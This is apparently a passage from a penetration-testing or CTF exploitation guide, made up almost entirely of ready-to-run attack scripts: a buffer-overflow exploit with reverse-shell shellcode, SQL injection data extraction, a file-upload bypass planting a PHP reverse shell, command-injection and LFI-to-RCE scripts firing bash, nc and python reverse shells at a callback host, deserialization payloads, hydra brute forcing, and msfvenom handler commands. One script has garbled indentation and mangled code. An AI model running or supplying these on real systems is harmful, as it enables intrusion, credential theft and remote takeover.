    version=$(echo $line | awk '{for(i=4;i<=NF;i++) printf $i" "}')
    
    echo "=== Searching exploits for: $service $version on port $port ==="
    searchsploit "$service $version" | tee -a exploits_found.txt
    echo ""
done

# Extract only exploits (not DoS)
echo "=== Filtering non-DoS exploits ==="
cat exploits_found.txt | grep -vE "Denial of Service|DoS" | \
    grep -E "Remote Code Execution|Privilege Escalation|RCE"
```

**Integration with Metasploit:**

```bash
# Find Metasploit modules from searchsploit
searchsploit eternalblue | grep "Metasploit"

# Some exploits reference MSF modules
searchsploit apache 2.4.49 -t
# Look for "Metasploit Framework" in exploit titles

# Manual correlation
# Searchsploit result: "Apache 2.4.49 - Path Traversal"
# Metasploit search:
msfconsole -q -x "search apache 2.4.49"
```

**Exploit Verification and Modification:**

```bash
# View exploit source
searchsploit -x exploits/linux/local/12345.c

# Common modifications needed:
# 1. Change target IP/hostname
# 2. Adjust payload addresses (offsets, ROP gadgets)
# 3. Update callback IP for reverse shells
# 4. Modify ports
# 5. Update paths

# Example: Modifying Python exploit
searchsploit -m 50383  # Apache 2.4.49 exploit
vim 50383.py

# Typical changes:
# target_url = "http://TARGET_IP"  # Change to actual IP
# callback_ip = "ATTACKER_IP"       # Change to your IP
# callback_port = 4444              # Verify port
```

**Searchsploit Output Parsing:**

```bash
# Extract EDB-IDs
searchsploit apache 2.4 | grep -oP 'exploits/[^\s]+' | cut -d'/' -f4 | cut -d'.' -f1

# Get exploits with specific keywords
searchsploit windows | grep -i "privilege escalation" | grep -i "kernel"

# Filter by year
searchsploit apache 2.4 | grep "2021\|2022"

# Count results
searchsploit linux kernel | grep -c "Privilege Escalation"

# Create summary report
cat > exploit_summary.sh << 'EOF'
#!/bin/bash
service=$1
searchsploit "$service" > results.txt
total=$(wc -l < results.txt)
rce=$(grep -ci "remote code execution\|rce" results.txt)
priv=$(grep -ci "privilege escalation" results.txt)
echo "Service: $service"
echo "Total exploits: $total"
echo "RCE exploits: $rce"
echo "Privilege escalation: $priv"
EOF
```

---

#### Custom Exploitation Scripts

Custom scripts bridge gaps where automated tools fail, enabling tailored exploitation for unique vulnerabilities or specific CTF challenges.

**Python Exploitation Template:**

```python
#!/usr/bin/env python3
"""
Custom Exploitation Script Template
Target: [Service/Application]
Vulnerability: [CVE/Type]
"""

import socket
import sys
import struct
import time

# Configuration
TARGET_IP = "192.168.1.10"
TARGET_PORT = 9999
LHOST = "10.10.14.5"
LPORT = 4444

def send_payload(sock, payload):
    """Send payload to target"""
    try:
        sock.send(payload)
        response = sock.recv(1024)
        return response
    except Exception as e:
        print(f"[-] Error sending payload: {e}")
        return None

def generate_reverse_shell():
    """Generate reverse shell payload"""
    # msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f python
    buf =  b""
    buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"
    # ... (truncated for brevity - use actual msfvenom output)
    return buf

def exploit():
    """Main exploitation function"""
    print(f"[*] Targeting {TARGET_IP}:{TARGET_PORT}")
    
    try:
        # Connect to target
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((TARGET_IP, TARGET_PORT))
        print("[+] Connected to target")
        
        # Receive banner
        banner = sock.recv(1024)
        print(f"[*] Banner: {banner.decode('utf-8', errors='ignore')}")
        
        # Build payload
        offset = 2003  # Offset to EIP (from fuzzing/debugging)
        nop_sled = b"\x90" * 16
        shellcode = generate_reverse_shell()
        
        # Bad characters to avoid: \x00\x0a\x0d
        # Return address: 0x625011af (jmp esp from module without ASLR)
        eip = struct.pack("<I", 0x625011af)
        
        payload = b"A" * offset
        payload += eip
        payload += nop_sled
        payload += shellcode
        payload += b"C" * (3000 - len(payload))  # Padding
        
        print(f"[*] Payload size: {len(payload)} bytes")
        print(f"[*] Sending exploit...")
        
        # Send payload
        response = send_payload(sock, payload)
        
        if response:
            print(f"[*] Response: {response.decode('utf-8', errors='ignore')}")
        
        print("[+] Exploit sent!")
        print(f"[*] Check for shell on {LHOST}:{LPORT}")
        
        sock.close()
        
    except Exception as e:
        print(f"[-] Exploitation failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        TARGET_IP = sys.argv[1]
    
    print("[*] Custom Exploitation Script")
    print("[*] Starting listener: nc -lvnp 4444")
    time.sleep(2)
    
    exploit()
```

**Web Application Exploitation Script:**

```python
#!/usr/bin/env python3
"""
Web Application SQL Injection Exploitation
"""

import requests
import sys
import time
from urllib.parse import quote

TARGET_URL = "http://192.168.1.10/search.php"
INJECTION_PARAM = "id"

def test_injection(payload):
    """Test SQL injection payload"""
    params = {INJECTION_PARAM: payload}
    
    try:
        response = requests.get(TARGET_URL, params=params, timeout=5)
        return response.text
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return None

def blind_sqli_boolean(query):
    """Boolean-based blind SQL injection"""
    # Payload: 1' AND (SELECT substring(database(),1,1))='t'-- -
    payload = f"1' AND ({query})-- -"
    response = test_injection(payload)
    
    # Check for successful condition (customize based on app)
    if response and "Welcome" in response:
        return True
    return False

def extract_database_name():
    """Extract database name character by character"""
    print("[*] Extracting database name...")
    db_name = ""
    
    for pos in range(1, 50):
        for char in "abcdefghijklmnopqrstuvwxyz0123456789_":
            query = f"SELECT substring(database(),{pos},1)='{char}'"
            
            if blind_sqli_boolean(query):
                db_name += char
                print(f"[+] Database name: {db_name}")
                break
        else:
            # No more characters
            break
    
    return db_name

def union_based_sqli():
    """UNION-based SQL injection"""
    print("[*] Testing UNION-based SQLi...")
    
    # Determine number of columns
    for cols in range(1, 20):
        payload = f"1' UNION SELECT {','.join(['NULL']*cols)}-- -"
        response = test_injection(payload)
        
        if response and "error" not in response.lower():
            print(f"[+] Number of columns: {cols}")
            
            # Extract data
            payload = f"1' UNION SELECT {','.join(['NULL']*(cols-1))},database()-- -"
            response = test_injection(payload)
            print(f"[+] Database: {response}")
            
            payload = f"1' UNION SELECT {','.join(['NULL']*(cols-1))},group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -"
            response = test_injection(payload)
            print(f"[+] Tables: {response}")
            
            break

def time_based_sqli():
    """Time-based blind SQL injection"""
    print("[*] Testing time-based SQLi...")
    
    payload = "1' AND sleep(5)-- -"
    start = time.time()
    test_injection(payload)
    elapsed = time.time() - start
    
    if elapsed >= 5:
        print("[+] Time-based SQLi confirmed!")
        return True
    return False

def exploit_file_read(file_path):
    """Read files using LOAD_FILE"""
    payload = f"1' UNION SELECT 1,LOAD_FILE('{file_path}'),3-- -"
    response = test_injection(payload)
    return response

if __name__ == "__main__":
    print("[*] Web Application SQL Injection Exploiter")
    
    if len(sys.argv) > 1:
        TARGET_URL = sys.argv[1]
    
    # Test for injection
    print(f"[*] Target: {TARGET_URL}")
    
    # Basic injection test
    response = test_injection("1' OR '1'='1")
    if response:
        print("[+] Potential SQL injection detected")
        
        # Try different techniques
        union_based_sqli()
        
        if time_based_sqli():
            db_name = extract_database_name()
            print(f"[+] Database: {db_name}")
        
        # Attempt file read
        passwd = exploit_file_read("/etc/passwd")
        if passwd and "root:" in passwd:
            print("[+] File read successful!")
            print(passwd)
```

**File Upload Bypass Script:**

```python
#!/usr/bin/env python3
"""
File Upload Restriction Bypass
"""

import requests
import sys

TARGET_URL = "http://192.168.1.10/upload.php"
LHOST = "10.10.14.5"
LPORT = 4444

# PHP reverse shell
php_shell = f"""<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'");
?>"""

def upload_file(filename, content, content_type="application/x-php"):
    """Upload file to target"""
    files = {
        'file': (filename, content, content_type)
    }
    data = {
        'submit': 'Upload'
    }
    
    try:
        response = requests.post(TARGET_URL, files=files, data=data)
        return response.text
    except Exception as e:
        print(f"[-] Upload failed: {e}")
        return None

def bypass_extension_filter():
    """Try various extension bypass techniques"""
    techniques = [
        ("shell.php", php_shell),
        ("shell.php5", php_shell),
        ("shell.phtml", php_shell),
        ("shell.php.jpg", php_shell),  # Double extension
        ("shell.php%00.jpg", php_shell),  # Null byte injection
        ("shell.php\x00.jpg", php_shell),
        ("shell.php%20", php_shell),
		("shell.php.", php_shell), # Trailing dot 
		("shell.php::$DATA", php_shell), # NTFS ADS 
		("shell.PhP", php_shell), # Case variation
	]

for filename, content in techniques:
    print(f"[*] Trying: {filename}")
    response = upload_file(filename, content)
    
    if response and "success" in response.lower():
        print(f"[+] Upload successful with: {filename}")
        return filename

return None

def bypass_content_type(): """Bypass MIME type checking""" mime_types = [ "image/jpeg", "image/png", "image/gif", "text/plain", ]

for mime in mime_types:
    print(f"[*] Trying MIME type: {mime}")
    response = upload_file("shell.php", php_shell, mime)
    
    if response and "success" in response.lower():
        print(f"[+] Bypassed with MIME type: {mime}")
        return True

return False

def bypass_magic_bytes(): """Add valid file magic bytes before payload""" # GIF magic bytes gif_shell = b"GIF89a" + php_shell.encode()

print("[*] Trying magic byte bypass (GIF)")
response = upload_file("shell.php", gif_shell, "image/gif")

if response and "success" in response.lower():
    print("[+] Magic byte bypass successful")
    return True

# PNG magic bytes
png_shell = b"\x89PNG\r\n\x1a\n" + php_shell.encode()
response = upload_file("shell.php", png_shell, "image/png")

if response and "success" in response.lower():
    print("[+] Magic byte bypass successful")
    return True

return False

def polyglot_file(): """Create polyglot file (valid image + PHP code)""" # Simple polyglot: valid JPEG with PHP code in comment polyglot = b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" polyglot += php_shell.encode() polyglot += b"\xFF\xD9" # JPEG EOI marker

print("[*] Trying polyglot file")
response = upload_file("shell.jpg.php", polyglot, "image/jpeg")

if response and "success" in response.lower():
    print("[+] Polyglot upload successful")
    return True

return False

if **name** == "**main**": print("[_] File Upload Bypass Exploiter") print(f"[_] Target: {TARGET_URL}") print(f"[*] Reverse shell: {LHOST}:{LPORT}")

# Try different bypass techniques
if bypass_extension_filter():
    print("[+] Extension filter bypassed!")
elif bypass_content_type():
    print("[+] Content-Type filter bypassed!")
elif bypass_magic_bytes():
    print("[+] Magic byte filter bypassed!")
elif polyglot_file():
    print("[+] Uploaded polyglot file!")
else:
    print("[-] All bypass attempts failed")
    sys.exit(1)

print("[*] Start listener: nc -lvnp 4444")
print("[*] Trigger shell by accessing uploaded file")
````

**Command Injection Wrapper Script:**

```bash
#!/bin/bash
# Command Injection Automation Script

TARGET="http://192.168.1.10/ping.php"
PARAM="host"
INJECTION_CHARS=(";" "|" "||" "&" "&&" "\n" "\`" "\$(" "%0a")

test_injection() {
    local payload=$1
    local test_cmd="echo vulnerable123"
    
    # URL encode payload
    encoded=$(echo "$payload$test_cmd" | sed 's/ /%20/g' | sed 's/;/%3B/g')
    
    response=$(curl -s "$TARGET?$PARAM=$encoded")
    
    if echo "$response" | grep -q "vulnerable123"; then
        echo "[+] Command injection confirmed with: $payload"
        return 0
    fi
    return 1
}

exploit_injection() {
    local injection_char=$1
    local lhost=$2
    local lport=$3
    
    echo "[*] Exploiting with separator: $injection_char"
    
    # Try various reverse shell payloads
    declare -a payloads=(
        "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
        "nc $lhost $lport -e /bin/bash"
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    )
    
    for payload in "${payloads[@]}"; do
        echo "[*] Trying payload: ${payload:0:50}..."
        
        # Encode and send
        full_payload="127.0.0.1${injection_char}${payload}"
        encoded=$(echo "$full_payload" | jq -sRr @uri)
        
        curl -s "$TARGET?$PARAM=$encoded" &
        
        sleep 2
        
        # Check if connection established
        if nc -zv $lhost $lport 2>&1 | grep -q succeeded; then
            echo "[+] Reverse shell established!"
            return 0
        fi
    done
    
    return 1
}

# Main execution
echo "[*] Command Injection Exploiter"
echo "[*] Target: $TARGET"

LHOST="10.10.14.5"
LPORT="4444"

if [ $# -eq 2 ]; then
    LHOST=$1
    LPORT=$2
fi

# Test for injection
echo "[*] Testing for command injection..."
for char in "${INJECTION_CHARS[@]}"; do
    if test_injection "$char"; then
        echo "[*] Starting reverse shell listener on $LHOST:$LPORT"
        
        # Start listener in background
        nc -lvnp $LPORT &
        listener_pid=$!
        
        sleep 2
        
        # Attempt exploitation
        exploit_injection "$char" "$LHOST" "$LPORT"
        
        # Wait for connection
        wait $listener_pid
        break
    fi
done
````

**Local File Inclusion (LFI) to RCE Script:**

```python
#!/usr/bin/env python3
"""
LFI to RCE Exploitation Script
Techniques: Log poisoning, PHP wrappers, /proc/self/environ
"""

import requests
import sys
import base64

TARGET_URL = "http://192.168.1.10/index.php"
LFI_PARAM = "page"
LHOST = "10.10.14.5"
LPORT = 4444

def test_lfi(file_path):
    """Test if LFI vulnerability exists"""
    params = {LFI_PARAM: file_path}
    try:
        response = requests.get(TARGET_URL, params=params, timeout=5)
        return response.text
    except Exception as e:
        print(f"[-] Request failed: {e}")
        return None

def lfi_basic_test():
    """Test basic LFI with common files"""
    print("[*] Testing for LFI vulnerability...")
    
    test_files = [
        "/etc/passwd",
        "../../../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
        "/etc/passwd%00",
        "/etc/passwd%00.jpg",
    ]
    
    for file_path in test_files:
        print(f"[*] Testing: {file_path}")
        response = test_lfi(file_path)
        
        if response and "root:" in response:
            print(f"[+] LFI confirmed with: {file_path}")
            return True
    
    return False

def php_wrapper_rce():
    """Exploit using PHP wrappers"""
    print("[*] Attempting PHP wrapper exploitation...")
    
    # PHP base64 wrapper for code execution
    php_code = f"<?php system('bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'); ?>"
    encoded = base64.b64encode(php_code.encode()).decode()
    
    payload = f"php://filter/convert.base64-decode/resource=data://text/plain;base64,{encoded}"
    
    print(f"[*] Payload: {payload[:80]}...")
    response = test_lfi(payload)
    
    if response:
        print("[+] PHP wrapper executed")
        return True
    
    # Try data:// wrapper
    payload = f"data://text/plain,{php_code}"
    response = test_lfi(payload)
    
    if response:
        print("[+] data:// wrapper executed")
        return True
    
    # Try expect:// wrapper (if expect extension loaded)
    cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
    payload = f"expect://id"
    response = test_lfi(payload)
    
    if response:
        print("[+] expect:// wrapper available")
        payload = f"expect://{cmd}"
        test_lfi(payload)
        return True
    
    return False

def log_poisoning():
    """Exploit via log file poisoning"""
    print("[*] Attempting log poisoning...")
    
    log_files = [
        "/var/log/apache2/access.log",
        "/var/log/apache/access.log",
        "/var/log/nginx/access.log",
        "/var/log/httpd/access_log",
        "/var/www/logs/access.log",
    ]
    
    # Poison User-Agent
    php_payload = f"<?php system('bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'); ?>"
    headers = {"User-Agent": php_payload}
    
    print("[*] Poisoning logs with PHP payload...")
    requests.get(TARGET_URL, headers=headers)
    
    # Include poisoned log
    for log_file in log_files:
        print(f"[*] Testing log file: {log_file}")
        response = test_lfi(log_file)
        
        if response and "bash -i" in response:
            print(f"[+] Log poisoning successful: {log_file}")
            return True
    
    return False

def proc_environ_exploit():
    """Exploit via /proc/self/environ"""
    print("[*] Attempting /proc/self/environ exploitation...")
    
    # Poison environment variable
    php_payload = f"<?php system('bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'); ?>"
    headers = {"User-Agent": php_payload}
    
    requests.get(TARGET_URL, headers=headers)
    
    # Include /proc/self/environ
    response = test_lfi("/proc/self/environ")
    
    if response and "bash -i" in response:
        print("[+] /proc/self/environ exploitation successful")
        return True
    
    return False

def session_file_inclusion():
    """Exploit via PHP session files"""
    print("[*] Attempting session file inclusion...")
    
    # Create session with malicious data
    session = requests.Session()
    
    php_payload = f"<?php system('bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'); ?>"
    
    # Set session variable
    data = {"username": php_payload}
    session.post(TARGET_URL, data=data)
    
    # Get session ID
    cookies = session.cookies.get_dict()
    if 'PHPSESSID' in cookies:
        sess_id = cookies['PHPSESSID']
        print(f"[*] Session ID: {sess_id}")
        
        # Try to include session file
        sess_paths = [
            f"/var/lib/php/sessions/sess_{sess_id}",
            f"/tmp/sess_{sess_id}",
            f"/var/lib/php5/sess_{sess_id}",
        ]
        
        for path in sess_paths:
            print(f"[*] Testing: {path}")
            response = test_lfi(path)
            
            if response and php_payload in response:
                print(f"[+] Session file inclusion successful: {path}")
                return True
    
    return False

def ssh_log_poisoning():
    """Exploit via SSH log poisoning"""
    print("[*] Attempting SSH log poisoning...")
    
    import paramiko
    
    # SSH connection with malicious username
    php_payload = f"<?php system('bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'); ?>"
    
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # This will fail but poison the log
        client.connect(
            TARGET_URL.split('/')[2].split(':')[0],
            username=php_payload,
            password="invalid",
            timeout=3
        )
    except:
        pass  # Expected to fail
    
    # Include SSH log
    ssh_logs = [
        "/var/log/auth.log",
        "/var/log/secure",
        "/var/log/sshd.log",
    ]
    
    for log in ssh_logs:
        print(f"[*] Testing: {log}")
        response = test_lfi(log)
        
        if response and "bash -i" in response:
            print(f"[+] SSH log poisoning successful: {log}")
            return True
    
    return False

if __name__ == "__main__":
    print("[*] LFI to RCE Exploiter")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Reverse shell: {LHOST}:{LPORT}")
    
    if len(sys.argv) > 1:
        TARGET_URL = sys.argv[1]
    
    # Test for LFI
    if not lfi_basic_test():
        print("[-] LFI vulnerability not detected")
        sys.exit(1)
    
    print("[+] LFI vulnerability confirmed!")
    print("[*] Start listener: nc -lvnp 4444")
    
    # Try exploitation techniques
    if php_wrapper_rce():
        print("[+] RCE achieved via PHP wrapper!")
    elif log_poisoning():
        print("[+] RCE achieved via log poisoning!")
    elif proc_environ_exploit():
        print("[+] RCE achieved via /proc/self/environ!")
    elif session_file_inclusion():
        print("[+] RCE achieved via session file inclusion!")
    elif ssh_log_poisoning():
        print("[+] RCE achieved via SSH log poisoning!")
    else:
        print("[-] All RCE attempts failed")
        print("[*] Manual exploitation may be required")
```

**Deserialization Exploitation Script:**

```python
#!/usr/bin/env python3
"""
PHP Object Injection / Deserialization Exploit
"""

import requests
import pickle
import base64

TARGET_URL = "http://192.168.1.10/index.php"
COOKIE_NAME = "user_data"

def generate_php_object_injection():
    """Generate malicious serialized PHP object"""
    
    # PHP gadget chain example (adjust based on target application)
    # This creates a PHP object that executes system commands
    
    php_serialized = 'O:8:"UserData":1:{s:4:"role";s:5:"admin";}'
    
    # For command execution (if __destruct or __wakeup methods exist)
    # Example with system() call:
    cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
    php_rce = f'O:10:"SystemExec":1:{{s:3:"cmd";s:{len(cmd)}:"{cmd}";}}'
    
    return php_rce

def generate_python_pickle_exploit():
    """Generate malicious Python pickle payload"""
    
    class Exploit:
        def __reduce__(self):
            import os
            cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
            return (os.system, (cmd,))
    
    payload = pickle.dumps(Exploit())
    return base64.b64encode(payload).decode()

def test_php_deserialization():
    """Test PHP deserialization vulnerability"""
    print("[*] Testing PHP object injection...")
    
    payload = generate_php_object_injection()
    
    cookies = {COOKIE_NAME: payload}
    
    try:
        response = requests.get(TARGET_URL, cookies=cookies, timeout=5)
        print(f"[*] Response length: {len(response.text)}")
        
        # Check for successful injection indicators
        if "admin" in response.text or "root" in response.text:
            print("[+] PHP object injection may be successful")
            return True
            
    except Exception as e:
        print(f"[-] Request failed: {e}")
    
    return False

def test_python_deserialization():
    """Test Python pickle deserialization"""
    print("[*] Testing Python pickle deserialization...")
    
    payload = generate_python_pickle_exploit()
    
    data = {"serialized_data": payload}
    
    try:
        response = requests.post(TARGET_URL, data=data, timeout=5)
        print("[*] Payload sent")
        return True
    except Exception as e:
        print(f"[-] Request failed: {e}")
    
    return False

def java_deserialization_exploit():
    """Generate Java deserialization payload using ysoserial"""
    import subprocess
    
    print("[*] Generating Java deserialization payload...")
    
    # Using ysoserial tool
    cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
    
    try:
        # Generate payload with ysoserial
        result = subprocess.run(
            ["java", "-jar", "/opt/ysoserial/ysoserial.jar", "CommonsCollections6", cmd],
            capture_output=True
        )
        
        payload = base64.b64encode(result.stdout).decode()
        
        # Send payload (adjust based on target)
        headers = {"Content-Type": "application/x-java-serialized-object"}
        response = requests.post(TARGET_URL, data=result.stdout, headers=headers)
        
        print("[+] Java deserialization payload sent")
        return True
        
    except Exception as e:
        print(f"[-] Failed: {e}")
    
    return False

if __name__ == "__main__":
    print("[*] Deserialization Exploit Script")
    print(f"[*] Target: {TARGET_URL}")
    
    # Try different deserialization exploits
    if test_php_deserialization():
        print("[+] PHP deserialization successful!")
    elif test_python_deserialization():
        print("[+] Python pickle deserialization successful!")
    elif java_deserialization_exploit():
        print("[+] Java deserialization successful!")
    else:
        print("[-] Deserialization exploitation failed")
```

**Brute Force Automation Script:**

```bash
#!/bin/bash
# Multi-Protocol Brute Force Automation

TARGET=$1
SERVICE=$2
USER_FILE=${3:-/usr/share/seclists/Usernames/top-usernames-shortlist.txt}
PASS_FILE=${4:-/usr/share/wordlists/rockyou.txt}

if [ -z "$TARGET" ] || [ -z "$SERVICE" ]; then
    echo "Usage: $0 <target> <service> [userfile] [passfile]"
    echo "Services: ssh, ftp, http, smb, mysql, rdp"
    exit 1
fi

echo "[*] Brute Force Automation"
echo "[*] Target: $TARGET"
echo "[*] Service: $SERVICE"

case $SERVICE in
    ssh)
        echo "[*] SSH brute force attack"
        hydra -L $USER_FILE -P $PASS_FILE ssh://$TARGET -t 4 -V -f -o ssh_creds.txt
        
        # If hydra finds creds, test connection
        if [ -f ssh_creds.txt ] && [ -s ssh_creds.txt ]; then
            creds=$(grep "login:" ssh_creds.txt | head -1)
            user=$(echo $creds | awk '{print $5}')
            pass=$(echo $creds | awk '{print $7}')
            
            echo "[+] Found credentials: $user:$pass"
            echo "[*] Testing SSH connection..."
            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@$TARGET "whoami; id"
        fi
        ;;
        
    ftp)
        echo "[*] FTP brute force attack"
        hydra -L $USER_FILE -P $PASS_FILE ftp://$TARGET -t 16 -V -f -o ftp_creds.txt
        ;;
        
    http)
        echo "[*] HTTP POST brute force"
        echo "[*] Target form: $TARGET/login.php"
        
        # Hydra HTTP form attack
        hydra -L $USER_FILE -P $PASS_FILE $TARGET http-post-form \
            "/login.php:username=^USER^&password=^PASS^:Invalid credentials" \
            -t 10 -V -f -o http_creds.txt
        ;;
        
    smb)
        echo "[*] SMB brute force attack"
        crackmapexec smb $TARGET -u $USER_FILE -p $PASS_FILE --continue-on-success | \
            tee smb_creds.txt
        
        # Extract successful logins
        grep "Pwn3d!" smb_creds.txt
        ;;
        
    mysql)
        echo "[*] MySQL brute force attack"
        hydra -L $USER_FILE -P $PASS_FILE mysql://$TARGET -t 4 -V -f -o mysql_creds.txt
        ;;
        
    rdp)
        echo "[*] RDP brute force attack"
        hydra -L $USER_FILE -P $PASS_FILE rdp://$TARGET -t 4 -V -f -o rdp_creds.txt
        ;;
        
    *)
        echo "[-] Unknown service: $SERVICE"
        exit 1
        ;;
esac

echo "[*] Brute force complete"
[ -f ${SERVICE}_creds.txt ] && cat ${SERVICE}_creds.txt
```

**Shellcode Generation and Injection:**

```python
#!/usr/bin/env python3
"""
Shellcode Generator and Injector
Integrates with msfvenom for payload generation
"""

import subprocess
import sys
import struct

def generate_shellcode(payload_type, lhost, lport, arch="x86", platform="linux"):
    """Generate shellcode using msfvenom"""
    
    msfvenom_cmd = [
        "msfvenom",
        "-p", f"{platform}/{arch}/{payload_type}",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "python",
        "-b", "\\x00\\x0a\\x0d",  # Bad characters
    ]
    
    print(f"[*] Generating shellcode: {' '.join(msfvenom_cmd)}")
    
    try:
        result = subprocess.run(msfvenom_cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            # Extract shellcode from msfvenom output
            shellcode_lines = [line for line in result.stdout.split('\n') if line.startswith('buf')]
            shellcode = ''.join(shellcode_lines)
            
            print(f"[+] Shellcode generated ({len(shellcode)} bytes)")
            return eval(shellcode.replace('buf = ', ''))
        else:
            print(f"[-] msfvenom failed: {result.stderr}")
            return None
            
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def find_jmp_esp(binary_path):
    """Find JMP ESP gadget in binary (simplified)"""
    # In practice, use ROPgadget or similar tools
    # This is a placeholder for demonstration
    
    print(f"[*] Searching for JMP ESP in {binary_path}")
    
    # Example: Static address (in real scenario, use dynamic finding)
    jmp_esp_address = 0x625011af
    
    print(f"[+] JMP ESP found at: 0x{jmp_esp_address:08x}")
    return jmp_esp_address

def create_exploit(offset, shellcode, jmp_esp):
    """Create full exploit payload"""
    
    nop_sled = b"\x90" * 16
    padding = b"A" * offset
    eip = struct.pack("<I", jmp_esp)
    post_padding = b"C" * 100
    
    exploit = padding + eip + nop_sled + shellcode + post_padding
    
    print(f"[+] Exploit created:")
    print(f"    Offset: {offset}")
    print(f"    EIP: 0x{jmp_esp:08x}")
    print(f"    Shellcode: {len(shellcode)} bytes")
    print(f"    Total: {len(exploit)} bytes")
    
    return exploit

def send_exploit(target, port, payload):
    """Send exploit to target"""
    import socket
    
    print(f"[*] Sending exploit to {target}:{port}")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        
        # Receive banner
        banner = sock.recv(1024)
        print(f"[*] Banner: {banner.decode('utf-8', errors='ignore')}")
        
        # Send exploit
        sock.send(payload)
        print("[+] Exploit sent!")
        
        sock.close()
        return True
        
    except Exception as e:
        print(f"[-] Failed: {e}")
        return False

if __name__ == "__main__":
    print("[*] Shellcode Generator and Injector")
    
    # Configuration
    TARGET = "192.168.1.10"
    PORT = 9999
    LHOST = "10.10.14.5"
    LPORT = 4444
    OFFSET = 2003
    
    # Generate shellcode
    shellcode = generate_shellcode("shell_reverse_tcp", LHOST, LPORT)
    
    if not shellcode:
        print("[-] Shellcode generation failed")
        sys.exit(1)
    
    # Find return address
    jmp_esp = find_jmp_esp("/path/to/vulnerable/binary")
    
    # Create exploit
    exploit_payload = create_exploit(OFFSET, shellcode, jmp_esp)
    
    # Start listener
    print(f"[*] Start listener: nc -lvnp {LPORT}")
    input("[*] Press Enter when listener is ready...")
    
    # Send exploit
    if send_exploit(TARGET, PORT, exploit_payload):
        print("[+] Check your listener for shell!")
    else:
        print("[-] Exploitation failed")
```

**Multi-Tool Exploitation Wrapper:**

```bash
#!/bin/bash
# Universal Exploitation Wrapper
# Combines multiple tools for comprehensive exploitation

TARGET=$1
OUTPUT_DIR="exploitation_$(date +%Y%m%d_%H%M%S)"

mkdir -p $OUTPUT_DIR/{metasploit,searchsploit,custom,logs}

echo "[*] Universal Exploitation Framework"
echo "[*] Target: $TARGET"
echo "[*] Output directory: $OUTPUT_DIR"

# Phase 1: Search for exploits
echo "=== Phase 1: Exploit Search ==="

# Get services from nmap
nmap -sV $TARGET -oN $OUTPUT_DIR/nmap_scan.txt

# Searchsploit lookup
grep -E "open.*tcp" $OUTPUT_DIR/nmap_scan.txt | while read line; do
    service=$(echo $line | awk '{print $3,$4,$5}')
    echo "[*] Searching exploits for: $service"
    searchsploit "$service" >> $OUTPUT_DIR/searchsploit/results.txt
done

# Phase 2: Metasploit automation
echo "=== Phase 2: Metasploit Automation ==="

cat > $OUTPUT_DIR/metasploit/auto_exploit.rc << EOF
workspace -a auto_exploit_$TARGET
db_nmap -sV $TARGET
search type:exploit
EOF

msfconsole -q -r $OUTPUT_DIR/metasploit/auto_exploit.rc | \
    tee $OUTPUT_DIR/metasploit/msf_output.txt

# Phase 3: Custom script execution
echo "=== Phase 3: Custom Scripts ==="

# Web vulnerability testing
if grep -q "80/tcp\|443/tcp" $OUTPUT_DIR/nmap_scan.txt; then
    echo "[*] Testing web vulnerabilities"
    
    # SQL injection
    sqlmap -u "http://$TARGET/?id=1" --batch --dump-all \
        > $OUTPUT_DIR/custom/sqlmap.txt 2>&1 &
    
    # XSS testing
    dalfox url "http://$TARGET" > $OUTPUT_DIR/custom/xss.txt 2>&1 &
fi

# Wait for background jobs
wait

echo "[*] Exploitation phase complete"
echo "[*] Review results in: $OUTPUT_DIR"
```

---

#### Important Integration Notes

**Combining Tools Effectively:**

```bash
# Workflow: Searchsploit → Metasploit
# 1. Find exploit with searchsploit
searchsploit apache 2.4.49 | grep "Remote Code"

# 2. Copy exploit to examine
searchsploit -m 50383

# 3. Check if Metasploit module exists
msfconsole -q -x "search apache 2.4.49; exit"

# 4. Use Metasploit if available, otherwise use manual exploit
```

**Custom Script to Metasploit Handler:**

```bash
# Generate payload with msfvenom
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o payload.elf

# Deliver via custom script (HTTP, FTP, etc.)
python3 custom_upload.py --target 192.168.1.10 --file payload.elf

# Catch with Metasploit handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; exploit"
```

---

#### Important Related Topics

For comprehensive exploitation tool mastery, consider studying:

- **msfvenom Payload Generation** - advanced payload crafting and encoding
